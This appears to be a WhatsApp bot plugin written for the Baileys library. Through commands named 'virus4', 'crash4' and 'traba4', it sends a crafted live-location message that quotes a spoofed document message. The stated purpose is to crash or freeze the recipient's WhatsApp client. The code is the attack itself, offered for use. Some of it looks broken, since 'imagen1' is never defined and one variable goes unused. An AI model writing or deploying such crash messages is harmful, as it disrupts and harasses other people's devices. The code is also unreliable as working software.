const { prepareWAMessageMedia, proto, generateWAMessageFromContent } = (await import('@adiwajshing/baileys')).default
import fs from 'fs'
let handler = async (m, { conn, text, args, usedPrefix, command }) => {	   
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./Menu2.jpg') }, { upload: conn.waUploadToServer })
const doc = { 
key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m ? { remoteJid: "" } : {})},
"message": { "documentMessage": { "url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc", "mimetype": "application/octet-stream", "fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=", "fileLength": "64455", "pageCount": 1, "mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=", "fileName": `simple•MD`, "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="}}}
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `© simple`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": imagen1,
}
}), { userJid: m.chat, quoted: doc })
conn.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
}
handler.command = ['virus4', 'c4', 'binario4', 'traba4', 'crash4'] 
handler.rowner = true
export default handler
